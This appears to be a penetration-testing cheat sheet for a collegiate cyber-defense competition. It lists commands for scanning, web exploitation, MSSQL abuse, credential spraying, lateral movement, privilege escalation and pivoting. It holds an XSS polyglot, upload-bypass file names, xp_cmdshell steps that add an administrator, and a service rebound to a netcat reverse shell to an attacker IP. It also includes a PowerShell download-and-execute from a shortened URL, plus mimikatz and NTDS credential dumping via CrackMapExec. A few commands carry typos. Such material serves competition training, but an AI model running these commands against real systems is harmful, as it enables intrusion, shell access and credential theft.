# CPTC Cheatsheet

## Setup
-----------
Windows:
```
1. powershell -ExecutionPolicy Bypass
2. ./install.ps1
```

Linux:
```
./tool-setup.sh
```

### Initial Tasks
-------
### OpenVAS
```
./openvas-docker.sh
```

### Scans
Do these scans on your perspective subnet.
#### Host Discovery
```
nmap -sP -T4 -v -oG live_hosts 10.10.10.0/24
```
```
cat live_hosts.gnmap | grep Up | awk {'print $2'} > live_hosts.txt
```

#### Short TCP full-tcp scan of live hosts
```
nmap -p- -T4 -v -oA full_tcp -iL live_hosts.txt
```

#### Detailed TCP full-tcp scan of live hosts
```
nmap -p- -T4 -v -sV -oA full_tcp -iL live_hosts 
```

#### Short UDP Scan
```
nmap -sU --max-retries 2 -T4 -v -oA basic_udp -iL live_hosts
```

#### EyeWitness Scan

Off of `Nmap` Scan
```
python3 EyeWitness.py -x nmapscan.xml --web -d directory_name
```

Off of List of URLS
```
python3 Eyewitness.py -f urls.txt --web -d directory_name
```

Now go to `report.html` in your directory, and open it up in firefox.

```
& firefox report.html
```

### Exploiting Low Hanging Fruit
---
#### Google
Google the service, version number, and then exploit.

```
Google search: vsftpd 2.3.4 exploit
```
#### SearchSploit
Searchsploit searches for exploits against services.
```
searchsploit [service + version number]
```

Example:
```
searchsploit vsftpd 2.3.4
```

To download:
```
searchsploit -m 17491
```

#### Vulnerable common apps/services:
* Tomcat
* JBoss
* Wordpress
* Joomla
* SMB/Samba
* Magento

### Web Applications
-------
Run these automated tools in the background first, and then enumerate the site manually, browsing like a real user. Make sure to use Burp or OWASP Zap to proxy all your traffic and analyze each request.

#### Nikto
```
nikto -h $ip -o nikto_$port.txt
```

#### Gobuster
```
gobuster dir -u "http://$ip" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,307,403,500' -e | tee '$directory/gobusster_80_output.txt'
```

#### WebDAV
If it is WebDav enabled (Look for GET, PUT, MOVE methods allowed)
```
cadaver $IP
```
And upload your shell by `PUT` ing it in there.

#### robots.txt
Browse to 
```
http://$ip/robots.txt
```
and see if there are any interesting directories.

#### CGI Files
If you found any files, maybe vulnerable to shellshock.
https://github.com/mubix/shellshocker-pocs/blob/master/shell_shocker.py

#### File Upload Bypass

```
.jpg.php
shell.php%00.jpg
shell.asp;jpg
shell.phtml
```
#### XSS 

Basic XSS
```
<alert>(1)</alert>
```

XSS polyglot
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

#### SQL Injection

Make sure you put `'` on any input field to invoke errors that could lead to information disclosure.
Things like version numbers from verbose error output may help in exploitation!

* Manual: https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
* SQLMAP: https://hackertarget.com/sqlmap-tutorial/


### msfvenom payloads
---
Use this for webshells, binaries, etc.
https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet/


### Interacting with Services
---

### 21 -  FTP


Sign in as:
```
anonymous:[any password, including blank]
```

### 22 - SSH

Hydra to password spray:
```
hydra -l <username> -p <password <ip/CIDR> ssh -vV
```

### 25 - STMP
```
telnet $ip 25
```

### 53 - DNS
```
sublist3r -d <domain> -v -t 20 
```
### 139/445 - SMB
Please refer to CrackMapExec section as well!

#### Nmap Script Scanning
```
nmap -p 445 -script=smb-vuln-* $ip -oA $ip_smb_script_scan
```

#### List accessible shares
```
smbclient -L //$ip
```

```
smbclient //MOUNT/share -I $ip N
```

#### 1433 - MSSQL
####  Nmap Script Scanning
```
nmap -p $port --script ms-sql* $ip
```

#### Logging in with user creds
Default creds for SQL are `sa:[blank]` or `sa:Password123`. Google for more.
```
sqsh -S <target_ip>:<port>
```

#### Command Execution while logged in
You can leverage command execution (showcased below) to get a shell. Transfer a netcat binary, and use xp_cmdshell to run that to get a shell (refer to 0xRick's `Querier` HackThebox Blog). 
```
exec sp_configure 'show advanced options', 1
go
reconfigure
go
exec sp_configre 'xp_cmdshell', 1
go
reconfigure
go
xp_cmdshell 'dir c:\''
go
```

You can also add yourself as local admin :)
```
xp_cmdshell “net user angelo ‘password’ /ADD
xp_cmdshell “net localgroup /ADD Administrators angelo”
```

### 3306 - MYSQL
#### Nmap script scan
```
nmap --script mysql* $ip -p $port
```

#### Login
Default login is `root:[no password]`.
```
mysql -h $ip -u <username> -p <password>
```

### 3389 - RDP
```
rdesktop <ip>
```

*Scan for BLUEKEEP!*

### 5432 - PostgresSQL
```
psql -u <user> -h <ip> -p <port> [<db_name>]
```

### 9200,9300 - ElasticSearch
Common Misconfigs:
* No Access Roles or Authentication
* Give unauthenticated users read/write to ElasticSearch, through Kibana or HTTP requests
* HTTP- Accessible API

### 27017 - MongoDB
#### Login
```
mongo -u <user> -p <password> <ip>/<db>
```

Default mongo has no auth.

```
mongo <ip>
```
### Lateral Movement
---
Refer to CrackMapExec section for specific commands.

#### psexec
Use psexec to autheenticate with valid credentials. CME has command below.

#### Open shares
Look for open shares, look for text files with passwords. CME has a module for this (spidering).

#### Using Responder to get NTLM hashes

This will only work if your machine is in the internal network.

Example: 
```
responder -I tun0 (change depending on network interface)
```

If you have code execution and can list files/directories, particularly shares, list your own share

Example through SQL injection: 
```
exec master.dbo.xp_dirtree '\\10.10.14.41'
```

Example in RDP:
```
Just open up Windows explorer and type \\10.10.14.41
```

To crack an NTLM hash, use hashcat.
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt  --force
```



### Privilege Escalation
---
#### Windows (Local)
* https://www.fuzzysecurity.com/tutorials/16.html
* Unquoted Service Paths - https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
* Try to look for services running as System (get accesschk binary on there first) 
``` 
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc config SSDPSRV binpath= "C:\Inetpub\nc.exe -nv 10.11.0.188 4444 -e C:\WINDOWS\System32\cmd.exe"
sc config SSDPSRV obj= ".\LocalSystem" password= ""
sc qc SSDPSRV
net start SSDPSRV
```

##### PowerUp

PowerUp finds misconfigurations in Windows boxes that could be leveraged for privilege escalation.

PowerUp.ps1 through Github without touching disk:

```
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
```


This uses PowerUp.ps1 through your attacking smb server and outputs a `checks.txt` to the victim machine.
```
powershell.exe  -ExecutionPolicy Bypass -command "& { . Import-Module \\10.11.0.188\GELO\PowerUp.ps1; Invoke-AllChecks | Out-File -Encoding ASCII checks.txt }"
```


#### Windows (Domain)
* Bloodhound to find fastest path to DA
* Kerberoasting
* https://www.gracefulsecurity.com/privilege-escalation-in-windows-domains/
 
#### Linux
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
* [linuxprivchecker.py](https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py)
* SUID bits, mounts, local running serviccs, kernel exploits, cronjobs

### CrackMapExec Cheat Sheet (Lateral Movement, Privilege Escalation)
---
#### spray credentials against smb
```
cme smb 172.16.164.10-15 -u user -p password
```

#### execute commands across hosts
```
cme smb 172.16.164.10-15 -u user -p password -x whoami
```

#### list modules (example: mimikatz)
```
cme smb 172.16.164.10-15 -u user -p password -l
```

#### run mimikatz across hosts
```
cme smb 172.16.164.10-15 -u user -p password -m mimikatz
 ```

#### view dumped creds in cme database
```
sudo cmedb
proto smb
creds (lists creds you've gathered so far)
hosts (lists hosts you've enumertated so far)
hosts 1 (check what credentials you have for a certain host)
```


#### list all domain groups
```
cme smb 172.16.164.10 -u user 'password' --groups
```

#### list domain admins
```
cme smb 172.16.164.10 -u user 'password' --groups 'domain admins'
```

#### view all domain groups enumerated in cme database
```
sudo cmedb
groups
group admins (list all admin groups)
group [id] (list all users in that group)
```

#### enumerate shares on a network
```
cme smb 172.16.164.10-15 -u user -p 'password' --shares
```
look for read/write permisions


#### spider share for passwords, both filenames and file contents!
```
cme smb 172.16.164.11-u user -p 'password' --spider dontlook --pattern pas --content
``` 
 
#### local privilege esclaiton via gpp_password (gives you credentials)
```
cme smb 172.16.164.10 -u user -p 'password' -m gpp_password
```

#### domain privilege escalation via ntds
```
cme smb 172.16.164.13 -u administrator -p paswrod1 --ntds
```

#### auth through sql instead of smb:
```
cme msql 172.16.164.10-15 -x ipconfig
```

#### sql mimikatz
```
cme msql 172.16.164.11 -u user -p password -m mimikatz
```

#### sql vnc
```
cme msql 172.16.164.11 -u user -p password -m invoke_vnc --options
```
####  ssh
```
cme ssh 172.16.164.0/24
 ```
 
 
#### winrm
```
cme winrm 172.16.164.0/24
cme winrm 172.16.164.10-15 -u user -p password
cme winrm 172.16.164.10-15 -u user -p password -x whoami
```
 
#### additional resources for CME
https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference
https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/



### Pivoting
---

Once you’re on a box, `ipconfig` and check if it is connected to other subnets other than the current one you’re in. Congrats! You can pivot. Use proxychains or Sshuttle

#### SSHUTTLE
```
pip install sshuttle
```

```
sshuttle -r username@sshserver 0.0.0.0/0 -vv 
Or 
sudo sshuttle -r username@sshserver 0.0.0.0/0 -vv 
Or
sudo sshuttle -r username@sshserver 0/0 -vv 
```

This will connect as “sean” to “10.11.1.251” and set access to anything.
```
sshuttle -r sean@10.11.1.251 0.0.0.0/24
```

This will connect as “sean” to “10.11.1.251” and set access to anything inside of the “10.1.1.0/24” Subnet
```
sshuttle -r sean@10.11.1.251 10.1.1.0/24
```


### Screen
| Purpose      | Command |
| ----------- | ----------- |
| start a new screen session with session name    | `screen -S <name`       |
| list running sessions/screens   | `screen -ls`        |
| attatch to a running session  | `screen -x`     |
| attach to session name   | `screen -r`        |


### Tmux
| Purpose      | Command |
| ----------- | ----------- |
| open a new tab    | `tmux + c`       |
| list running sessions   | `tmux -s`        |
|  split vertically | `tmux "`     |
| split horizontally   | `tmux %`        |


